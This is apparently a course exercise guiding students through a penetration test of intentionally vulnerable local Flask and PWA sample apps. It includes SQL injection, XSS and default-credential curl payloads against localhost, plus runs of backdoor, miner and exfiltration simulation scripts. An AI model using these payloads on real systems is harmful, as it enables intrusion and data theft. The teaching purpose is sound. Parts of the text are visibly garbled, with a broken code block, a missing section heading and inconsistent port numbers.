# Penetration Testing Exercise
**Duration**: 4-5 hours  
**Difficulty**: Advanced  
**Prerequisites**: Completion of SAST, DAST, Network Analysis, and Sandbox exercises

## 📍 Getting Started - Important Navigation

**� CRITICAL: Always start from the main project folder:**
```bash
# If you get lost, return to the main folder:
cd /workspaces/Docker_Sandbox_Demo

# Check you're in the right place:
ls
```
**Expected Output:**
```
copilot-instructions.md  docker/  docs/  reports/  samples/  src/  ...
```

**⚠️ MOST IMPORTANT: This exercise requires strict ethical guidelines!**

## �🎯 Learning Objectives

By the end of this exercise, students will be able to:
- ✅ Understand the penetration testing methodology and ethical considerations
- ✅ Conduct comprehensive reconnaissance using multiple techniques
- ✅ Integrate SAST, DAST, Network Analysis, and Sandbox findings for vulnerability assessment
- ✅ Perform controlled exploitation in a safe environment
- ✅ Document findings and recommendations professionally
- ✅ Understand the importance of responsible disclosure and ethical hacking

## 🛡️ Ethical Guidelines and Legal Considerations

### ⚠️ CRITICAL - Read Before Proceeding

**This exercise is for EDUCATIONAL PURPOSES ONLY and must be conducted in the provided controlled environment.**

**Think of this like learning to be a "good guy" security guard who tests locks and alarms to make sure they work properly.**

### Ethical Hacking Principles (Memorize These!)
1. **Permission**: Only test systems you own or have explicit written permission to test
2. **Scope**: Stay within the defined scope of testing (this sandbox environment only)
3. **Documentation**: Document all activities for learning and accountability
4. **Responsibility**: Report findings responsibly and help improve security
5. **No Harm**: Never cause damage or disruption to systems or data

### Legal Responsibilities (This Is Serious!)
- **NEVER** use these techniques against systems you don't own
- **ALWAYS** obtain written permission before testing any system
- **REPORT** vulnerabilities through proper channels
- **RESPECT** privacy and confidentiality of any data encountered
- **FOLLOW** your organization's security policies and procedures

### 📝 Student Ethics Agreement
**Before continuing, write and sign this agreement:**

```
I, [Your Name], understand that:
✅ These techniques are for learning cybersecurity defense only
✅ I will NEVER use these skills on systems I don't own  
✅ I will NEVER access computers, networks, or accounts without permission
✅ I will report any real vulnerabilities through proper channels
✅ I understand that unauthorized computer access is a serious crime
✅ I will only use these techniques in this controlled practice environment

Student Signature: _________________ Date: _________
```

## 📋 Exercise Overview

This comprehensive penetration testing exercise integrates all previous security analysis methods:
- **Phase 1: Reconnaissance** - Information gathering using network analysis (like casing a building)
- **Phase 2: Vulnerability Assessment** - Combining SAST, DAST, and sandbox findings (like finding weak locks)
- **Phase 3: Exploitation** - Controlled exploitation of identified vulnerabilities (like testing if weak locks actually open)
- **Phase 4: Post-Exploitation** - Understanding impact and maintaining access (like seeing what you could access)
- **Phase 5: Reporting** - Professional documentation and recommendations (like writing a security report)

## 🔍 Phase 1: Reconnaissance (45 minutes)

### 🎯 Goal: Gather comprehensive information about the target environment using ethical techniques

### Step 1: Set Up Your Testing Environment

**Navigate to main folder:**
```bash
cd /workspaces/Docker_Sandbox_Demo
pwd
```
**Expected Output:**
```
/workspaces/Docker_Sandbox_Demo
```

**Start target applications:**
```bash
# Start the applications we'll be testing
cd samples/vulnerable-flask-app && python app.py &
cd ../../samples/unsecure-pwa && python main.py &

# Return to main folder
cd /workspaces/Docker_Sandbox_Demo

# Wait for applications to start
sleep 10
```

**Verify applications are running:**
```bash
curl -I http://localhost:5000
curl -I http://localhost:9090
```
**Expected Output:**
```
HTTP/1.1 200 OK
Server: Werkzeug/X.X.X Python/3.X.X
(Additional headers...)
```

### Step 2: Network Discovery

**Discover active services:**
```bash
python src/analyzer/network_cli.py --scan-services localhost --educational
```
**Expected Output:**
```
🌐 NETWORK SERVICE DISCOVERY
🎯 Target: localhost
📅 Scan Date: 2025-XX-XX

DISCOVERED SERVICES:
✅ Port 5000: HTTP (Flask Application)
✅ Port 9090: HTTP (PWA Application)  
✅ Port 22: SSH (if available)

SERVICE DETAILS:
Flask App (Port 5000):
- Technology: Python/Flask
- Status: Running
- Risk Level: Medium (Development server)

PWA App (Port 9090):
- Technology: Python Web App
- Status: Running  
- Risk Level: Medium (Unsecured configuration)
```

**Check for running web applications:**
```bash
python src/analyzer/network_cli.py --monitor-connections --educational
```

### Step 3: Web Application Enumeration

**Enumerate web directories and files:**
```bash
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational
```
**Expected Output:**
```
🌐 DYNAMIC APPLICATION SECURITY TESTING (DAST) REPORT
🎯 Target: http://localhost:5000

🔍 Directory Discovery:
Found: /admin
Found: /login  
Found: /api
Found: /debug (potentially sensitive)

🔍 Technology Detection:
Server: Werkzeug (Development server)
Framework: Flask
Language: Python

SECURITY FINDINGS:
❌ Missing security headers
⚠️ Debug mode potentially enabled
🔍 Multiple endpoints discovered
```

**Test the PWA application:**
```bash
python src/analyzer/dast_cli.py http://localhost:9090 --educational
```

### Step 4: Technology Stack Identification

**Analyze application code:**
```bash
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational
```
**Expected Output:**
```
🔍 STATIC APPLICATION SECURITY TESTING (SAST) REPORT
📂 Target: samples/vulnerable-flask-app

TECHNOLOGY STACK:
- Language: Python 3.x
- Framework: Flask
- Database: SQLite (likely)
- Dependencies: [List of packages]

SECURITY FINDINGS SUMMARY:
🚨 High: X findings
⚠️ Medium: X findings  
🔵 Low: X findings
```

### 📝 Phase 1 Deliverable: Create Your Target Profile

**Fill out this reconnaissance worksheet:**

**Target Environment Profile:**

1. **Network Services Discovered:**
   - Port 5000: ___________________________
   - Port 9090: ___________________________  
   - Port 22: _____________________________
   - Other ports: _________________________

2. **Web Application Structure:**
   
   **Flask App (Port 5000):**
   - Endpoints found: ______________________
   - Technology stack: ____________________
   - Security headers: ____________________
   
   **PWA App (Port 9090):**
   - Endpoints found: ______________________
   - Technology stack: ____________________
   - Security headers: ____________________

3. **Technology Details:**
   - Programming language: ________________
   - Web framework: _______________________ 
   - Database type: _______________________
   - Server software: _____________________

4. **Initial Security Observations:**
   - Debug mode enabled: ⚪ Yes ⚪ No ⚪ Unknown
   - Missing security headers: ⚪ Yes ⚪ No
   - Sensitive endpoints exposed: ⚪ Yes ⚪ No
   - Development server in use: ⚪ Yes ⚪ No

5. **Potential Attack Vectors Identified:**
   - Web application vulnerabilities: ________
   - Configuration issues: ________________
   - Network service issues: ______________
   - Code-level vulnerabilities: ___________

**❌ Troubleshooting:**
- **Applications won't start?** Try: `cd docker && docker-compose up -d`
- **Connection refused?** Wait longer: `sleep 30` then try again
- **No services found?** Check applications are running: `curl http://localhost:5000`
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational --output reports/pentest_sast_flask.json
python src/analyzer/analyze_cli.py samples/unsecure-pwa --educational --output reports/pentest_sast_pwa.json

# Analyze suspicious scripts
python src/analyzer/analyze_cli.py samples/suspicious-scripts --educational --output reports/pentest_sast_scripts.json
```

**Analysis Task**: Review SAST findings and identify critical vulnerabilities suitable for exploitation.

### 2.2 Dynamic Security Testing
```bash
# Comprehensive DAST scans
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational --output reports/pentest_dast_flask.json
python src/analyzer/dast_cli.py http://localhost:8080 --deep-scan --educational --output reports/pentest_dast_pwa.json

# Test for specific vulnerabilities
python src/analyzer/dast_cli.py http://localhost:5000 --test-xss --test-sqli --educational
```

**Analysis Task**: Identify exploitable runtime vulnerabilities and misconfigurations.

### 2.3 Network Traffic Analysis
```bash
# Monitor network behavior during testing
python src/analyzer/network_cli.py --capture-traffic --duration 300 --educational --output reports/pentest_network.json

# Generate suspicious traffic to test detection
python samples/network-scenarios/suspicious_traffic_generator.py 120 &
python src/analyzer/network_cli.py --monitor-connections --duration 150 --educational
```

**Analysis Task**: Understand network communication patterns and potential covert channels.

### 2.4 Sandbox Analysis
```bash
# Analyze suspicious applications in controlled environment
python samples/backdoor-apps/backdoor_app.py &
sleep 5
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational

# Analyze resource abuse applications
python samples/resource-abuse/crypto_miner.py &
sleep 10
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational
```

**Analysis Task**: Identify malicious behavior patterns and backdoor communications.

### 📝 Vulnerability Assessment Deliverable
Create a vulnerability assessment report including:
- Categorized vulnerability list (Critical, High, Medium, Low)
- Exploitability assessment for each finding
- Risk prioritization matrix
- Recommended exploitation sequence

## ⚔️ Phase 3: Controlled Exploitation (90 minutes)

### Objective
Safely demonstrate exploitation of identified vulnerabilities in the controlled environment.

**⚠️ REMINDER: Only exploit vulnerabilities in the provided sandbox environment.**

### 3.1 Web Application Exploitation

#### SQL Injection Testing
```bash
# Test for SQL injection vulnerabilities identified in DAST
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' OR '1'='1&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test database enumeration
curl -X POST "http://localhost:5000/search" \
  -d "query=' UNION SELECT table_name FROM information_schema.tables--" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Documentation Task**: Record successful exploitation attempts and data accessed.

#### Cross-Site Scripting (XSS) Testing
```bash
# Test for reflected XSS
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Test for stored XSS
curl -X POST "http://localhost:5000/comment" \
  -d "comment=<img src=x onerror=alert('Stored XSS')>" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Documentation Task**: Demonstrate XSS impact and potential for session hijacking.

### 3.2 Configuration Exploitation

#### Debug Mode Exploitation
```bash
# Test debug mode information disclosure
curl "http://localhost:5000/debug" -v

# Test for exposed configuration
curl "http://localhost:5000/config" -v
```

**Documentation Task**: Document information disclosed through misconfigurations.

#### Weak Authentication Testing
```bash
# Test default credentials
curl -X POST "http://localhost:8080/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test weak password policy
curl -X POST "http://localhost:8080/login" \
  -d "username=admin&password=123" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Documentation Task**: Record authentication bypass techniques and success rates.

### 3.3 Network-Based Exploitation

#### Service Exploitation
```bash
# Test for service vulnerabilities discovered in network analysis
python src/analyzer/network_cli.py --scan-services localhost --ports 1337,4444,31337 --educational

# Monitor for backdoor communications
python samples/network-scenarios/backdoor_simulation.py 60 &
python src/analyzer/network_cli.py --monitor-connections --duration 70 --educational
```

**Documentation Task**: Identify and exploit network-based vulnerabilities.

### 📝 Exploitation Deliverable
Create an exploitation report including:
- Successful exploitation techniques used
- Data or access obtained through exploitation
- Screenshots and evidence of successful attacks
- Impact assessment for each exploited vulnerability

## 🔍 Phase 4: Post-Exploitation Analysis (45 minutes)

### Objective
Understand the full impact of successful exploitation and demonstrate advanced techniques.

### 4.1 Access Maintenance
```bash
# Simulate persistence mechanisms
python samples/backdoor-apps/backdoor_app.py &

# Monitor persistent connections
python src/analyzer/network_cli.py --monitor-connections --duration 120 --educational

# Test covert communication channels
python samples/network-scenarios/dns_threat_scenarios.py 60
```

**Documentation Task**: Document persistence techniques and covert communication methods.

### 4.2 Data Exfiltration Simulation
```bash
# Simulate data exfiltration patterns
python samples/network-scenarios/backdoor_simulation.py 90 &

# Monitor exfiltration traffic
python src/analyzer/network_cli.py --capture-traffic --duration 100 --educational --output reports/pentest_exfiltration.json
```

**Documentation Task**: Analyze data exfiltration patterns and detection evasion techniques.

### 4.3 Lateral Movement Simulation
```bash
# Test internal network discovery
python src/analyzer/network_cli.py --scan-services 127.0.0.1 --educational

# Simulate lateral movement patterns
python samples/network-scenarios/suspicious_traffic_generator.py 60
```

**Documentation Task**: Document lateral movement techniques and network traversal methods.

### 📝 Post-Exploitation Deliverable
Create a post-exploitation analysis including:
- Persistence mechanisms identified
- Data exfiltration capabilities
- Lateral movement possibilities
- Long-term impact assessment

## 📊 Phase 5: Professional Reporting (60 minutes)

### Objective
Create a comprehensive penetration testing report suitable for executive and technical audiences.

### 5.1 Executive Summary Template
```markdown
# Penetration Testing Report - Executive Summary

## Overview
- **Target**: Docker Sandbox Demo Environment
- **Testing Period**: [Date Range]
- **Methodology**: OWASP Testing Guide + Custom Framework
- **Scope**: Web Applications, Network Services, Code Analysis

## Key Findings
- **Critical Vulnerabilities**: [Number] identified
- **Exploitable Issues**: [Number] successfully exploited
- **Business Risk**: [High/Medium/Low]

## Recommendations
1. Immediate Actions Required
2. Short-term Improvements (1-3 months)
3. Long-term Security Strategy (6-12 months)
```

### 5.2 Technical Findings Report
```bash
# Compile all analysis reports
ls -la reports/pentest_*

# Generate integrated findings summary
python src/analyzer/analyze_cli.py samples/ --educational --output reports/pentest_final_sast.json
python src/analyzer/dast_cli.py --demo-apps --educational --output reports/pentest_final_dast.json
```

**Reporting Task**: Integrate findings from all testing phases into comprehensive technical documentation.

### 5.3 Risk Assessment Matrix

Create a risk matrix documenting:
- **Vulnerability Description**: Technical details of each finding
- **Exploitability**: Ease of exploitation (High/Medium/Low)
- **Impact**: Potential business impact (Critical/High/Medium/Low)
- **Risk Score**: Combined exploitability and impact assessment
- **Remediation**: Specific steps to address each vulnerability

### 📝 Final Deliverable Requirements
1. **Executive Summary** (1-2 pages)
2. **Technical Findings Report** (5-10 pages)
3. **Risk Assessment Matrix** (spreadsheet or table)
4. **Evidence Package** (screenshots, logs, proof-of-concept code)
5. **Remediation Roadmap** (prioritized action plan)

## 🎓 Assessment Criteria

Students will be evaluated on:

### Technical Competency (40%)
- Successful completion of reconnaissance phase
- Effective integration of SAST, DAST, Network, and Sandbox findings
- Demonstrated exploitation techniques
- Understanding of post-exploitation impact

### Methodology and Process (30%)
- Systematic approach to penetration testing
- Proper documentation throughout the process
- Adherence to ethical guidelines and scope
- Logical progression through testing phases

### Communication and Reporting (30%)
- Clear and professional report writing
- Appropriate technical detail for target audience
- Effective risk communication
- Actionable remediation recommendations

## 🔄 Integration with Previous Exercises

This penetration testing exercise builds directly on:
- **SAST Exercise**: Static analysis findings inform target selection
- **DAST Exercise**: Dynamic testing results guide exploitation attempts
- **Network Analysis**: Traffic monitoring reveals communication patterns
- **Sandbox Analysis**: Behavioral analysis informs post-exploitation assessment

## 💡 Key Learning Outcomes

After completing this exercise, students will understand:
- How individual security testing methods integrate into comprehensive assessments
- The penetration testing methodology and its real-world application
- The importance of ethical considerations in security testing
- Professional reporting and communication skills for security findings
- The value of systematic, documented security assessment processes

## 🛡️ Ethical Reflection Questions

1. What are the ethical implications of penetration testing in real-world scenarios?
2. How do you ensure penetration testing activities stay within legal and ethical boundaries?
3. What responsibilities do security professionals have when discovering vulnerabilities?
4. How should vulnerability disclosure be handled in different organizational contexts?
5. What measures can organizations take to ensure ethical security testing practices?

---

**⚠️ Remember**: This exercise must only be conducted in the provided sandbox environment. Never apply these techniques to systems you do not own or lack explicit permission to test.